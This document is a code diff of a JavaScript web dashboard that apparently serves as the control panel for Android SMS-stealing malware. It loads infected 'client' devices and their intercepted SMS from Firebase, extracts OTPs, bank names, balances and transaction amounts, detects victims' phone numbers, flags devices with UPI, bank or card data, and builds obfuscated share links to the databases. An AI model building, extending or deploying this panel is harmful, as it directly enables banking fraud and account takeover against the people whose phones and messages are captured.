-        const sendResult = $('sendResult');
-        const smsSearch = $('smsSearch');
-        const sendDevicePhone = $('sendDevicePhone');
-        const detailPhoneDisplay = $('detailPhoneDisplay');
-        const bankNameDisplay = $('bankNameDisplay');
-        const bankMessageList = $('bankMessageList');
-        const bankBalance = $('bankBalance');
+// ZOOM
+function applyZoom() { document.body.style.zoom = zoomLevel + '%'; }
+$('zoomIn').addEventListener('click', () => { zoomLevel = Math.min(zoomLevel + 10, 150); applyZoom(); });
+$('zoomOut').addEventListener('click', () => { zoomLevel = Math.max(zoomLevel - 10, 70); applyZoom(); });
+$('zoomReset').addEventListener('click', () => { zoomLevel = 100; applyZoom(); });
 
-        const tabBtns = document.querySelectorAll('.tab-btn');
-        const tabContents = {
-            info: $('tabInfo'),
-            bank: $('tabBank'),
-            sms: $('tabSms'),
-            send: $('tabSend')
-        };
+const BANK_NAMES = [
+    'Canara Bank', 'State Bank of India', 'SBI', 'HDFC Bank', 'ICICI Bank',
+    'Axis Bank', 'Kotak Mahindra Bank', 'Yes Bank', 'PNB', 'Punjab National Bank',
+    'Bank of Baroda', 'BOB', 'Union Bank', 'IDFC Bank', 'IndusInd Bank',
+    'RBL Bank', 'Bank of India', 'Central Bank', 'Indian Bank', 'UCO Bank',
+    'Bank of Maharashtra', 'Indian Overseas Bank', 'South Indian Bank',
+    'Federal Bank', 'Dhanlaxmi Bank', 'Karur Vysya Bank', 'Lakshmi Vilas Bank',
+    'Tamilnad Mercantile Bank', 'City Union Bank', 'Nainital Bank',
+    'Karnataka Bank', 'Saraswat Bank', 'Kalyan Janata Sahakari Bank',
+    'Shamrao Vithal Co-operative Bank', 'Citibank', 'Standard Chartered',
+    'HSBC', 'Deutsche Bank', 'ABN AMRO', 'Barclays', 'BNP Paribas'
+];
 
-        // ─── BANK DETECTION ──────────────────────────────────────────────
-        const BANK_NAMES = [
-            'Canara Bank', 'State Bank of India', 'SBI', 'HDFC Bank', 'ICICI Bank',
-            'Axis Bank', 'Kotak Mahindra Bank', 'Yes Bank', 'PNB', 'Punjab National Bank',
-            'Bank of Baroda', 'BOB', 'Union Bank', 'IDFC Bank', 'IndusInd Bank',
-            'RBL Bank', 'Bank of India', 'Central Bank', 'Indian Bank', 'UCO Bank',
-            'Bank of Maharashtra', 'Indian Overseas Bank', 'South Indian Bank',
-            'Federal Bank', 'Dhanlaxmi Bank', 'Karur Vysya Bank', 'Lakshmi Vilas Bank',
-            'Tamilnad Mercantile Bank', 'City Union Bank', 'Nainital Bank',
-            'Karnataka Bank', 'Saraswat Bank', 'Kalyan Janata Sahakari Bank',
-            'Shamrao Vithal Co-operative Bank', 'Citibank', 'Standard Chartered',
-            'HSBC', 'Deutsche Bank', 'ABN AMRO', 'Barclays', 'BNP Paribas'
-        ];
+const SENDER_BANK_MAP = {
+    'CENTBK': 'Central Bank of India', 'CBIN': 'Central Bank of India',
+    'SBIIN': 'SBI', 'SBIN': 'SBI', 'HDFCB': 'HDFC Bank', 'HDFC': 'HDFC Bank',
+    'ICICI': 'ICICI Bank', 'AXISB': 'Axis Bank', 'KOTAK': 'Kotak Mahindra Bank',
+    'YESB': 'Yes Bank', 'PNB': 'PNB', 'BOB': 'Bank of Baroda',
+    'UBIN': 'Union Bank', 'IDFC': 'IDFC Bank', 'INDB': 'IndusInd Bank',
+    'RBLB': 'RBL Bank', 'BKID': 'Bank of India', 'CNRB': 'Canara Bank',
+    'UTIB': 'Axis Bank', 'SBHY': 'State Bank of Hyderabad',
+    'MAHB': 'Bank of Maharashtra', 'IOBA': 'Indian Overseas Bank',
+    'SOUB': 'South Indian Bank', 'FDRL': 'Federal Bank',
+    'DLXB': 'Dhanlaxmi Bank', 'KVBL': 'Karur Vysya Bank',
+    'LVCB': 'Lakshmi Vilas Bank', 'TMBL': 'Tamilnad Mercantile Bank',
+    'CUB': 'City Union Bank', 'NBTB': 'Nainital Bank',
+    'KARB': 'Karnataka Bank', 'SRCB': 'Saraswat Bank',
+    'KJSB': 'Kalyan Janata Sahakari Bank', 'SVCB': 'Shamrao Vithal Co-operative Bank',
+    'CITI': 'Citibank', 'SCB': 'Standard Chartered', 'HSBC': 'HSBC',
+    'DB': 'Deutsche Bank', 'ABN': 'ABN AMRO', 'BARCLAYS': 'Barclays',
+    'BNP': 'BNP Paribas'
+};
 
-        const SENDER_BANK_MAP = {
-            'CENTBK': 'Central Bank of India', 'CBIN': 'Central Bank of India',
-            'SBIIN': 'SBI', 'SBIN': 'SBI', 'HDFCB': 'HDFC Bank', 'HDFC': 'HDFC Bank',
-            'ICICI': 'ICICI Bank', 'AXISB': 'Axis Bank', 'KOTAK': 'Kotak Mahindra Bank',
-            'YESB': 'Yes Bank', 'PNB': 'PNB', 'BOB': 'Bank of Baroda',
-            'UBIN': 'Union Bank', 'IDFC': 'IDFC Bank', 'INDB': 'IndusInd Bank',
-            'RBLB': 'RBL Bank', 'BKID': 'Bank of India', 'CNRB': 'Canara Bank',
-            'UTIB': 'Axis Bank', 'SBHY': 'State Bank of Hyderabad',
-            'MAHB': 'Bank of Maharashtra', 'IOBA': 'Indian Overseas Bank',
-            'SOUB': 'South Indian Bank', 'FDRL': 'Federal Bank',
-            'DLXB': 'Dhanlaxmi Bank', 'KVBL': 'Karur Vysya Bank',
-            'LVCB': 'Lakshmi Vilas Bank', 'TMBL': 'Tamilnad Mercantile Bank',
-            'CUB': 'City Union Bank', 'NBTB': 'Nainital Bank',
-            'KARB': 'Karnataka Bank', 'SRCB': 'Saraswat Bank',
-            'KJSB': 'Kalyan Janata Sahakari Bank', 'SVCB': 'Shamrao Vithal Co-operative Bank',
-            'CITI': 'Citibank', 'SCB': 'Standard Chartered', 'HSBC': 'HSBC',
-            'DB': 'Deutsche Bank', 'ABN': 'ABN AMRO', 'BARCLAYS': 'Barclays',
-            'BNP': 'BNP Paribas'
-        };
-
-        function detectBankName(text, sender) {
-            if (sender) {
-                const upper = sender.toUpperCase();
-                for (const [key, bank] of Object.entries(SENDER_BANK_MAP)) {
-                    if (upper.includes(key)) return bank;
-                }
-            }
-            const lower = text.toLowerCase();
-            for (const b of BANK_NAMES) {
-                if (lower.includes(b.toLowerCase())) return b;
-            }
-            if (lower.includes('sbi')) return 'SBI';
-            if (lower.includes('hdfc')) return 'HDFC Bank';
-            if (lower.includes('icici')) return 'ICICI Bank';
-            if (lower.includes('axis')) return 'Axis Bank';
-            if (lower.includes('kotak')) return 'Kotak Mahindra Bank';
-            if (lower.includes('pnb')) return 'PNB';
-            if (lower.includes('bob')) return 'Bank of Baroda';
-            if (lower.includes('canara')) return 'Canara Bank';
-            if (lower.includes('union bank')) return 'Union Bank';
-            return null;
+function detectBankName(text, sender) {
+    if (sender) {
+        const upper = sender.toUpperCase();
+        for (const [key, bank] of Object.entries(SENDER_BANK_MAP)) {
+            if (upper.includes(key)) return bank;
         }
+    }
+    const lower = text.toLowerCase();
+    for (const b of BANK_NAMES) {
+        if (lower.includes(b.toLowerCase())) return b;
+    }
+    if (lower.includes('sbi')) return 'SBI';
+    if (lower.includes('hdfc')) return 'HDFC Bank';
+    if (lower.includes('icici')) return 'ICICI Bank';
+    if (lower.includes('axis')) return 'Axis Bank';
+    if (lower.includes('kotak')) return 'Kotak Mahindra Bank';
+    if (lower.includes('pnb')) return 'PNB';
+    if (lower.includes('bob')) return 'Bank of Baroda';
+    if (lower.includes('canara')) return 'Canara Bank';
+    if (lower.includes('union bank')) return 'Union Bank';
+    return null;
+}
 
-        function detectTxType(text) {
-            const lower = text.toLowerCase();
-            if (lower.includes('credit') || lower.includes('credited') || lower.includes('received') ||
-                lower.includes('deposit') || lower.includes('added')) return 'credit';
-            if (lower.includes('debit') || lower.includes('debited') || lower.includes('withdraw') ||
-                lower.includes('deduct') || lower.includes('spent') || lower.includes('paid')) return 'debit';
-            return null;
+function detectTxType(text) {
+    const lower = text.toLowerCase();
+    if (lower.includes('credit') || lower.includes('credited') || lower.includes('received') ||
+        lower.includes('deposit') || lower.includes('added')) return 'credit';
+    if (lower.includes('debit') || lower.includes('debited') || lower.includes('withdraw') ||
+        lower.includes('deduct') || lower.includes('spent') || lower.includes('paid')) return 'debit';
+    return null;
+}
+
+function isCreditDebitSms(msg) {
+    const text = msg.message.toLowerCase();
+    return /credit|debit|credited|debited|withdraw|deposit|received|spent|paid/.test(text);
+}
+
+function isBankSms(msg) {
+    const text = msg.message.toLowerCase();
+    return /balance|bank|credit|debit|ac no|account|upi|received|rs\.|₹|withdraw|deposit|credited|debited/.test(text) &&
+           isCreditDebitSms(msg);
+}
+
+function extractBalanceFromText(text) {
+    const match = text.match(/(?:balance|bal|rs\.?|₹)\s*[:.]?\s*([\d,]+\.?\d*)/i);
+    if (match) return match[1];
+    return null;
+}
+
+function extractBalance(msg) {
+    return extractBalanceFromText(msg.message);
+}
+
+function extractOtp(msg) {
+    const match = msg.message.match(/\b(\d{4,8})\b/);
+    return match ? match[1] : null;
+}
+
+function extractTransactionAmount(text) {
+    const match = text.match(/(?:rs\.?|₹)\s*([\d,]+\.?\d*)/i);
+    if (match) return match[1];
+    return null;
+}
+
+function getDeviceBankSms(deviceId) {
+    const msgs = messageCache[deviceId] || [];
+    return msgs.filter(m => isBankSms(m) && isCreditDebitSms(m));
+}
+
+function getLatestBalance(deviceId) {
+    const bankMsgs = getDeviceBankSms(deviceId);
+    if (!bankMsgs.length) return null;
+    for (const m of bankMsgs) {
+        const bal = extractBalance(m);
+        if (bal) return bal;
+    }
+    return null;
+}
+
+function getLatestBankName(deviceId) {
+    const bankMsgs = getDeviceBankSms(deviceId);
+    if (!bankMsgs.length) return null;
+    for (const m of bankMsgs) {
+        const bank = detectBankName(m.message, m.sender);
+        if (bank) return bank;
+    }
+    return null;
+}
+
+function deviceHasBankSms(deviceId) {
+    return getDeviceBankSms(deviceId).length > 0;
+}
+
+function updateClock() {
+    const now = new Date();
+    const options = { timeZone: 'Asia/Kolkata', hour12: false };
+    const timeStr = now.toLocaleTimeString('en-IN', options);
+    clockDisplay.textContent = timeStr;
+}
+function startClock() { updateClock(); if(clockTimer) clearInterval(clockTimer); clockTimer = setInterval(updateClock,1000); }
+
+function toast(msg, type='success') {
+    const el = $('toast');
+    el.textContent = msg;
+    el.className = 'toast ' + type + ' show';
+    clearTimeout(el._hide);
+    el._hide = setTimeout(() => el.classList.remove('show'), 3000);
+}
+
+const SALT = 'XxR$P@n3l!';
+function encodeFirebaseConn(url, key) {
+    return btoa(url + '|||' + (key || ''));
+}
+function decodeFirebaseConn(encoded) {
+    try {
+        let str = atob(encoded);
+        let parts = str.split('|||');
+        if (parts[0] && parts[0].startsWith('https://') && parts[0].includes('firebaseio.com')) {
+            return { url: parts[0].trim(), key: (parts[1] || '').trim() };
         }
-
-        function isCreditDebitSms(msg) {
-            const text = msg.message.toLowerCase();
-            return /credit|debit|credited|debited|withdraw|deposit|received|spent|paid/.test(text);
+    } catch(e) {}
+    try {
+        let dec = decodeURIComponent(atob(encoded));
+        let str = '';
+        for (let i=0; i<dec.length; i++) {
+            str += String.fromCharCode(dec.charCodeAt(i) ^ SALT.charCodeAt(i % SALT.length));
         }
-
-        function isBankSms(msg) {
-            const text = msg.message.toLowerCase();
-            return /balance|bank|credit|debit|ac no|account|upi|received|rs\.|₹|withdraw|deposit|credited|debited/.test(text) &&
-                   isCreditDebitSms(msg);
+        let parts = str.split('|||');
+        if (parts[0] && parts[0].startsWith('https://') && parts[0].includes('firebaseio.com')) {
+            return { url: parts[0].trim(), key: (parts[1] || '').trim() };
         }
-
-        function extractBalanceFromText(text) {
-            const match = text.match(/(?:balance|bal|rs\.?|₹)\s*[:.]?\s*([\d,]+\.?\d*)/i);
-            if (match) return match[1];
-            return null;
+    } catch(e) {}
+    try {
+        let dec = atob(encoded);
+        let str = '';
+        for (let i=0; i<dec.length; i++) {
+            str += String.fromCharCode(dec.charCodeAt(i) ^ SALT.charCodeAt(i % SALT.length));
         }
-
-        function extractBalance(msg) {
-            return extractBalanceFromText(msg.message);
+        let parts = str.split('|||');
+        if (parts[0] && parts[0].startsWith('https://') && parts[0].includes('firebaseio.com')) {
+            return { url: parts[0].trim(), key: (parts[1] || '').trim() };
         }
+    } catch(e) {}
+    return { url: '', key: '' };
+}
 
-        function extractOtp(msg) {
-            const match = msg.message.match(/\b(\d{4,8})\b/);
-            return match ? match[1] : null;
+function updateShareLink() {
+    if (!activeConn) { shareLinkInput.value = ''; return; }
+    const encoded = encodeFirebaseConn(activeConn.url, activeConn.key || '');
+    const link = window.location.origin + window.location.pathname + '?s=' + encoded;
+    shareLinkInput.value = link;
+}
+
+function loadFromURL() {
+    const params = new URLSearchParams(window.location.search);
+    const s = params.get('s');
+    if (s) {
+        if (window.history.replaceState) {
+            window.history.replaceState({}, document.title, window.location.pathname);
         }
-
-        function getDeviceBankSms(deviceId) {
-            const msgs = messageCache[deviceId] || [];
-            return msgs.filter(m => isBankSms(m) && isCreditDebitSms(m));
-        }
-
-        function getLatestBalance(deviceId) {
-            const bankMsgs = getDeviceBankSms(deviceId);
-            if (!bankMsgs.length) return null;
-            for (const m of bankMsgs) {
-                const bal = extractBalance(m);
-                if (bal) return bal;
-            }
-            return null;
-        }
-
-        function getLatestBankName(deviceId) {
-            const bankMsgs = getDeviceBankSms(deviceId);
-            if (!bankMsgs.length) return null;
-            for (const m of bankMsgs) {
-                const bank = detectBankName(m.message, m.sender);
-                if (bank) return bank;
-            }
-            return null;
-        }
-
-        function deviceHasBankSms(deviceId) {
-            return getDeviceBankSms(deviceId).length > 0;
-        }
-
-        // ─── CLOCK (IST) ──────────────────────────────────────────────────
-        function updateClock() {
-            const now = new Date();
-            const options = { timeZone: 'Asia/Kolkata', hour12: false };
-            const timeStr = now.toLocaleTimeString('en-IN', options);
-            clockDisplay.textContent = timeStr;
-        }
-        function startClock() { updateClock(); if(clockTimer) clearInterval(clockTimer); clockTimer = setInterval(updateClock,1000); }
-
-        // ─── TOAST ──────────────────────────────────────────────────────────
-        function toast(msg, type='success') {
-            const el = $('toast');
-            el.textContent = msg;
-            el.className = 'toast ' + type + ' show';
-            clearTimeout(el._hide);
-            el._hide = setTimeout(() => el.classList.remove('show'), 3000);
-        }
-
-        // ─── SHARE LINK WITH SALT ─────────────────────────────────────────
-        const SALT = 'XxR$P@n3l!';
-        function encodeFirebaseConn(url, key) {
-            // Simple base64 — works everywhere, no XOR mess
-            return btoa(url + '|||' + (key || ''));
-        }
-        function decodeFirebaseConn(encoded) {
-            try {
-                // Strategy 1: Simple base64 (new format — like dark-x-panel)
-                let str = atob(encoded);
-                let parts = str.split('|||');
-                if (parts[0] && parts[0].startsWith('https://') && parts[0].includes('firebaseio.com')) {
-                    return { url: parts[0].trim(), key: (parts[1] || '').trim() };
-                }
-            } catch(e) {}
-
-            try {
-                // Strategy 2: XOR + encodeURIComponent (old format — backward compat)
-                let dec = decodeURIComponent(atob(encoded));
-                let str = '';
-                for (let i=0; i<dec.length; i++) {
-                    str += String.fromCharCode(dec.charCodeAt(i) ^ SALT.charCodeAt(i % SALT.length));
-                }
-                let parts = str.split('|||');
-                if (parts[0] && parts[0].startsWith('https://') && parts[0].includes('firebaseio.com')) {
-                    return { url: parts[0].trim(), key: (parts[1] || '').trim() };
-                }
-            } catch(e) {}
-
-            try {
-                // Strategy 3: XOR only (very old format)
-                let dec = atob(encoded);
-                let str = '';
-                for (let i=0; i<dec.length; i++) {
-                    str += String.fromCharCode(dec.charCodeAt(i) ^ SALT.charCodeAt(i % SALT.length));
-                }
-                let parts = str.split('|||');
-                if (parts[0] && parts[0].startsWith('https://') && parts[0].includes('firebaseio.com')) {
-                    return { url: parts[0].trim(), key: (parts[1] || '').trim() };
-                }
-            } catch(e) {}
-
-            return { url: '', key: '' };
-        }
-
-        function updateShareLink() {
-            if (!activeConn) { shareLinkInput.value = ''; return; }
-            const encoded = encodeFirebaseConn(activeConn.url, activeConn.key || '');
-            const link = window.location.origin + window.location.pathname + '?s=' + encoded;
-            shareLinkInput.value = link;
-        }
-
-        function loadFromURL() {
-            const params = new URLSearchParams(window.location.search);
-            const s = params.get('s');
-            if (s) {
-                // Clean URL immediately so user never sees ugly params
-                if (window.history.replaceState) {
-                    window.history.replaceState({}, document.title, window.location.pathname);
-                }
-                const decoded = decodeFirebaseConn(s);
-                if (decoded.url) {
-                    const existingIdx = CONNECTIONS.findIndex(c => c.url === decoded.url);
-                    let conn;
-                    if (existingIdx === -1) {
-                        const label = decoded.url.replace(/https?:\/\//,'').replace(/\.firebaseio\.com.*/,'');
-                        conn = {
-                            label: label,
-                            url: decoded.url,
-                            key: decoded.key,
-                            date: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })
-                        };
-                        CONNECTIONS.push(conn);
-                    } else {
-                        CONNECTIONS[existingIdx].key = decoded.key || CONNECTIONS[existingIdx].key;
-                        conn = CONNECTIONS[existingIdx];
-                    }
-                    localStorage.setItem('rsx_connections', JSON.stringify(CONNECTIONS));
-                    activeConn = conn;
-                    renderConnections();
-                    showDashboard();
-                    toast('Auto‑connected from shared link', 'success');
-                    return true;
-                }
-            }
-            return false;
-        }
-
-        // ─── SCREEN NAVIGATION ────────────────────────────────────────────
-        function showHome() {
-            homeScreen.classList.remove('hidden');
-            dashboardScreen.style.display = 'none';
-            renderConnections();
-            if (clockTimer) clearInterval(clockTimer);
-            if (pollTimer) clearInterval(pollTimer);
-            pollTimer = null;
-            updateShareLink();
-        }
-
-        function showDashboard() {
-            homeScreen.classList.add('hidden');
-            dashboardScreen.style.display = 'block';
-            startClock();
-            updateShareLink();
-            // Load cache
-            const cached = localStorage.getItem('rsx_cache_' + activeConn.url);
-            if (cached) {
-                try {
-                    const data = JSON.parse(cached);
-                    allDevices = data.devices || [];
-                    messageCache = data.messages || {};
-                    renderDeviceGrid();
-                    updateStats();
-                } catch(e) { /* ignore */ }
-            }
-            refreshDevices();
-            startPolling();
-        }
-
-        // ─── CONNECTIONS (URL hidden, only label + date) ──────────────────
-        function renderConnections() {
-            if (!connectionsList) return;
-            if (CONNECTIONS.length === 0) {
-                connectionsList.innerHTML = `<div style="color:var(--muted);padding:12px;text-align:center">No accounts saved.</div>`;
-                connCount.textContent = '0';
-                shareLinkInput.value = '';
-                return;
-            }
-            connCount.textContent = CONNECTIONS.length;
-            connectionsList.innerHTML = CONNECTIONS.map((c, i) => {
-                const displayLabel = c.label || c.url.replace(/https?:\/\//,'').replace(/\.firebaseio\.com.*/,'');
-                const shortLabel = displayLabel.length > 15 ? displayLabel.substring(0, 15) + '…' : displayLabel;
-                return `
-                    <div class="conn-item">
-                        <div class="info">
-                            <div class="name">${esc(shortLabel)}</div>
-                            <div class="date">${c.date || ''}</div>
-                        </div>
-                        <button class="copy-link" data-idx="${i}" title="Copy share link">🔗</button>
-                        <button class="connect" data-idx="${i}" title="Connect">▶</button>
-                        <button class="del" data-idx="${i}" title="Delete">✕</button>
-                    </div>
-                `;
-            }).join('');
-
-            connectionsList.querySelectorAll('.copy-link').forEach(btn => {
-                btn.addEventListener('click', () => {
-                    const idx = parseInt(btn.dataset.idx);
-                    const conn = CONNECTIONS[idx];
-                    if (!conn) return;
-                    const encoded = encodeFirebaseConn(conn.url, conn.key || '');
-                    const link = window.location.origin + window.location.pathname + '?s=' + encoded;
-                    navigator.clipboard.writeText(link).then(() => {
-                        toast('🔗 Link Copied!', 'success');
-                    }).catch(() => {
-                        const input = document.createElement('input');
-                        input.value = link;
-                        document.body.appendChild(input);
-                        input.select();
-                        document.execCommand('copy');
-                        document.body.removeChild(input);
-                        toast('🔗 Link Copied!', 'success');
-                    });
-                });
-            });
-
-            connectionsList.querySelectorAll('.connect').forEach(btn => {
-                btn.addEventListener('click', () => {
-                    const idx = parseInt(btn.dataset.idx);
-                    const conn = CONNECTIONS[idx];
-                    if (conn) {
-                        activeConn = conn;
-                        showDashboard();
-                        toast('Connected to ' + (conn.label || conn.url.replace(/https?:\/\//,'').substring(0,20)), 'success');
-                    }
-                });
-            });
-            connectionsList.querySelectorAll('.del').forEach(btn => {
-                btn.addEventListener('click', () => {
-                    const idx = parseInt(btn.dataset.idx);
-                    const label = CONNECTIONS[idx].label || CONNECTIONS[idx].url.replace(/https?:\/\//,'').substring(0,20);
-                    if (confirm('Delete "' + label + '"?')) {
-                        CONNECTIONS.splice(idx, 1);
-                        localStorage.setItem('rsx_connections', JSON.stringify(CONNECTIONS));
-                        renderConnections();
-                        toast('Deleted', 'error');
-                    }
-                });
-            });
-        }
-
-        // ─── FIREBASE HELPERS ─────────────────────────────────────────────
-        function fbUrl(path) {
-            const base = activeConn.url.replace(/\/+$/,'');
-            const auth = activeConn.key ? '?auth=' + activeConn.key : '';
-            return base + '/' + path + '.json' + auth;
-        }
-
-        async function fbGet(path) {
-            const url = fbUrl(path);
-            const res = await fetch(url);
-            if (!res.ok) {
-                let msg = await res.text();
-                throw new Error(`HTTP ${res.status}: ${msg.substring(0,50)}`);
-            }
-            return res.json();
-        }
-
-        async function fbSet(path, data) {
-            const url = fbUrl(path);
-            const res = await fetch(url, {
-                method: 'PUT',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(data)
-            });
-            if (!res.ok) {
-                let msg = await res.text();
-                throw new Error(`HTTP ${res.status}: ${msg.substring(0,50)}`);
-            }
-            return res.json();
-        }
-
-        function parseDevices(data) {
-            if (!data || typeof data !== 'object') return [];
-            return Object.keys(data).map(id => {
-                const d = data[id];
-                return {
-                    id,
-                    name: d.name || d.deviceName || id,
-                    phone: d.mobNo || d.phone || '',
-                    battery: d.batteryNum || d.battery || 0,
-                    status: d.status === true || d.online === true,
-                    note: d.note || d.notes || '',
-                    sims: d.sims || [],
-                    android: d.android || '',
-                    ip: d.ip || '',
-                    joined: d.joined || '',
-                    network: d.network || d.carrier || '',
-                    storage: d.storage || '',
-                    cpuArch: d.cpuArch || d.cpu || '',
-                    sdkVersion: d.sdkVersion || '',
-                    favorite: d.favorite || false,
-                    upi: d.upi || false,
-                    bank: d.bank || false,
-                    card: d.card || false,
-                    ...d
+        const decoded = decodeFirebaseConn(s);
+        if (decoded.url) {
+            const existingIdx = CONNECTIONS.findIndex(c => c.url === decoded.url);
+            let conn;
+            if (existingIdx === -1) {
+                const label = decoded.url.replace(/https?:\/\//,'').replace(/\.firebaseio\.com.*/,'');
+                conn = {
+                    label: label,
+                    url: decoded.url,
+                    key: decoded.key,
+                    date: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })
                 };
-            });
-        }
-
-        async function refreshDevices() {
-            if (!activeConn) return;
-            try {
-                const data = await fbGet('clients');
-                allDevices = parseDevices(data);
-                await loadAllMessages();
-                autoDetectPhoneNumbers();
-                renderDeviceGrid();
-                updateStats();
-                const cache = { devices: allDevices, messages: messageCache };
-                localStorage.setItem('rsx_cache_' + activeConn.url, JSON.stringify(cache));
-            } catch (e) {
-                toast('Failed to fetch devices: ' + e.message, 'error');
+                CONNECTIONS.push(conn);
+            } else {
+                CONNECTIONS[existingIdx].key = decoded.key || CONNECTIONS[existingIdx].key;
+                conn = CONNECTIONS[existingIdx];
             }
-        }
-
-        function autoDetectPhoneNumbers() {
-            for (const d of allDevices) {
-                const msgs = messageCache[d.id] || [];
-                let detectedNumber = null;
-                for (const msg of msgs) {
-                    const text = msg.message;
-                    if (text.toLowerCase().includes('plan expire') ||
-                        text.toLowerCase().includes('plan expired') ||
-                        text.toLowerCase().includes('main number') ||
-                        text.toLowerCase().includes('mob no') ||
-                        text.toLowerCase().includes('phone no')) {
-                        const numMatch = text.match(/(\+91|0)?[6-9]\d{9}/);
-                        if (numMatch) { detectedNumber = numMatch[0]; break; }
-                    }
-                    const numMatch = text.match(/(\+91|0)?[6-9]\d{9}/);
-                    if (numMatch) {
-                        const before = text.substring(0, text.indexOf(numMatch[0])).toLowerCase();
-                        if (before.includes('no') || before.includes('number') || before.includes('mob') ||
-                            before.includes('phone') || before.includes('sim') || before.includes('expire')) {
-                            detectedNumber = numMatch[0];
-                            break;
-                        }
-                    }
-                }
-                if (detectedNumber && !d.phone) {
-                    d.phone = detectedNumber;
-                    try { fbSet('clients/' + d.id + '/phone', detectedNumber); } catch(e) {}
-                }
-            }
-        }
-
-        async function loadAllMessages() {
-            for (const d of allDevices) {
-                try {
-                    const data = await fbGet('messages/' + d.id);
-                    let msgs = parseMessages(data);
-                    if (msgs.length > 150) msgs = msgs.slice(0, 150);
-                    messageCache[d.id] = msgs;
-                } catch(e) {
-                    messageCache[d.id] = [];
-                }
-            }
-        }
-
-        function parseDate(str) {
-            if (!str) return 0;
-            const s = String(str).trim();
-
-            // 1. Native Date parse
-            let d = new Date(s);
-            if (!isNaN(d.getTime())) return d.getTime();
-
-            // 2. DD-MM-YYYY | HH:mm AM/PM  (e.g. 11-08-2026 | 02:59 am)
-            const m1 = s.match(/(\d{1,2})[\/\-\.](\d{1,2})[\/\-\.](\d{4})\s*[|\,\s]+\s*(\d{1,2}):(\d{2})\s*(AM|PM|am|pm)/i);
-            if (m1) {
-                let hour = parseInt(m1[4], 10);
-                const minute = parseInt(m1[5], 10);
-                const ampm = m1[6].toUpperCase();
-                if (ampm === 'PM' && hour !== 12) hour += 12;
-                if (ampm === 'AM' && hour === 12) hour = 0;
-                d = new Date(parseInt(m1[3]), parseInt(m1[2])-1, parseInt(m1[1]), hour, minute, 0);
-                if (!isNaN(d.getTime())) return d.getTime();
-            }
-
-            // 3. DD-MM-YYYY | HH:mm:ss AM/PM
-            const m2 = s.match(/(\d{1,2})[\/\-\.](\d{1,2})[\/\-\.](\d{4})\s*[|\,\s]+\s*(\d{1,2}):(\d{2}):(\d{2})\s*(AM|PM|am|pm)/i);
-            if (m2) {
-                let hour = parseInt(m2[4], 10);
-                const minute = parseInt(m2[5], 10);
-                const second = parseInt(m2[6], 10);
-                const ampm = m2[7].toUpperCase();
-                if (ampm === 'PM' && hour !== 12) hour += 12;
-                if (ampm === 'AM' && hour === 12) hour = 0;
-                d = new Date(parseInt(m2[3]), parseInt(m2[2])-1, parseInt(m2[1]), hour, minute, second);
-                if (!isNaN(d.getTime())) return d.getTime();
-            }
-
-            // 4. DD-MM-YYYY HH:mm:ss (24-hour)
-            const m3 = s.match(/(\d{1,2})[\/\-\.](\d{1,2})[\/\-\.](\d{4})\s+(\d{1,2}):(\d{2}):(\d{2})/);
-            if (m3) {
-                d = new Date(+m3[3], +m3[2]-1, +m3[1], +m3[4], +m3[5], +m3[6]);
-                if (!isNaN(d.getTime())) return d.getTime();
-            }
-
-            // 5. DD-MM-YYYY HH:mm (24-hour, no seconds)
-            const m4 = s.match(/(\d{1,2})[\/\-\.](\d{1,2})[\/\-\.](\d{4})\s+(\d{1,2}):(\d{2})/);
-            if (m4) {
-                d = new Date(+m4[3], +m4[2]-1, +m4[1], +m4[4], +m4[5], 0);
-                if (!isNaN(d.getTime())) return d.getTime();
-            }
-
-            // 6. Date only
-            const m5 = s.match(/(\d{1,2})[\/\-\.](\d{1,2})[\/\-\.](\d{4})/);
-            if (m5) {
-                d = new Date(+m5[3], +m5[2]-1, +m5[1]);
-                if (!isNaN(d.getTime())) return d.getTime();
-            }
-
-            // 7. Unix timestamp
-            const num = parseInt(str);
-            if (!isNaN(num) && num > 1000000000) {
-                return num > 1000000000000 ? num : num * 1000;
-            }
-            return 0;
-        }
-
-        function parseMessages(data) {
-            if (!data || typeof data !== 'object') return [];
-            return Object.entries(data).map(([key, m]) => {
-                const rawDt = m.dateTime || m.timestamp || m.time || '';
-                return {
-                    key,
-                    message: m.message || m.text || '',
-                    sender: m.sender || '',
-                    dateTime: rawDt,
-                    type: m.type || 'incoming',
-                    otp: m.otp || '',
-                    _ts: parseDate(rawDt)
-                };
-            }).sort((a, b) => {
-                // Newest first by parsed timestamp
-                if (a._ts && b._ts) return b._ts - a._ts;
-                if (a._ts && !b._ts) return -1;
-                if (!a._ts && b._ts) return 1;
-                // Fallback: Firebase push IDs are chronological — newest key first
-                return a.key > b.key ? -1 : (a.key < b.key ? 1 : 0);
-            });
-        }
-
-        // ─── RENDER DEVICE GRID ───────────────────────────────────────────
-        function renderDeviceGrid() {
-            const q = searchQuery.toLowerCase().trim();
-            let filtered = allDevices;
-            if (filterMode === 'online') filtered = filtered.filter(d => d.status);
-            else if (filterMode === 'offline') filtered = filtered.filter(d => !d.status);
-            else if (filterMode === 'favorite') filtered = filtered.filter(d => d.favorite === true);
-            else if (filterMode === 'upi') filtered = filtered.filter(d => d.upi === true);
-            else if (filterMode === 'bank') filtered = filtered.filter(d => deviceHasBankSms(d.id));
-            else if (filterMode === 'card') filtered = filtered.filter(d => d.card === true);
-
-            if (q) filtered = filtered.filter(d =>
-                d.name.toLowerCase().includes(q) ||
-                d.id.toLowerCase().includes(q) ||
-                (d.phone && d.phone.includes(q))
-            );
-
-            if (sortMode === 'newest') filtered.sort((a,b) => (a.joined > b.joined ? -1 : 1));
-            else filtered.sort((a,b) => (a.joined > b.joined ? 1 : -1));
-
-            if (filtered.length === 0) {
-                deviceGrid.innerHTML = `<div class="empty-grid">No devices found.</div>`;
-                return;
-            }
-
-            deviceGrid.innerHTML = filtered.map(d => {
-                const bankMsgs = getDeviceBankSms(d.id);
-                const balance = getLatestBalance(d.id);
-                const bankName = getLatestBankName(d.id);
-                const phone = d.phone || '—';
-                const statusText = d.status ? 'Online' : 'Offline';
-                const statusClass = d.status ? 'online' : 'offline';
-                return `
-                    <div class="device-card" data-id="${d.id}">
-                        <div class="top">
-                            <div class="icon ${d.status ? 'online' : ''}">${d.status ? '●' : '○'}</div>
-                            <div class="info">
-                                <div class="name">${esc(d.id)}</div>
-                                <div class="sub">
-                                    <span>${esc(d.android || 'Android')}</span>
-                                    <span>🔋 ${d.battery || 0}%</span>
